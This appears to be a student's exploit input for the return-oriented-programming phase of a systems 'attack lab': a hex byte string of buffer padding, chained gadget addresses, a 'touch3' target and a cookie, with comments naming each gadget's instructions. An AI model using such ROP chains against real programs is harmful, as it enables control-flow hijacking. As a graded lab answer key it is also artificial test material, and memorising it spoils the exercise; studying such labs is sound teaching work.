@@ -1,0 +1,68 @@
+/*
+1e 1b 40 00	//nop, increases %rsp by 8 
+00 00 00 00	//retq
+
+50 1a 40 00	//movq %rdi + %rsi, %rax
+00 00 00 00 	//retq
+	
+1f 1a 40 00	//popq %rax	
+00 00 00 00	//movl %eax, edi 	//zeroes out first 32 bits of %rax
+
+c7 1a 40 00	//movq %rsp, %rax
+00 00 00 00  	//retq
+
+17 1a 40 00	//movq %rax, %rdi
+00 00 00 00	//retq
+
+48 1a 40 00	//popq %rax
+00 00 00 00	//retq
+
+69 1a 40 00	//movl %eax,%edx  
+00 00 00 00 	//nop nop retq
+
+6d 19 40 00	//touch3 address
+00 00 00 00	//has to be last string of input (I think)
+
+36 62 65 64     //at the end we want %rdi to point to the start of this
+31 62 33 32
+
+15 1a 40 00	//movq %rax, %rdi
+00 00 00 00 	//retq
+
+58 1a 40 00	//movl %ecx, %esi
+00 00 00 00	//retq
+
+ec 1a 40 00	//movl %edx, %ecx
+00 00 00 00	//retq
+
+e6 1a 40 00	//movl %eax, %edx
+00 00 00 00	//retq
+*/
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+c7 1a 40 00  
+00 00 00 00 
+17 1a 40 00
+00 00 00 00
+48 1a 40 00
+00 00 00 00
+48 00 00 00
+00 00 00 00
+e7 1a 40 00
+00 00 00 00
+ee 1a 40 00
+00 00 00 00
+5e 1a 40 00
+00 00 00 00 
+50 1a 40 00
+00 00 00 00
+17 1a 40 00
+00 00 00 00
+6d 19 40 00
+00 00 00 00
+36 62 65 64     
+31 62 33 32	
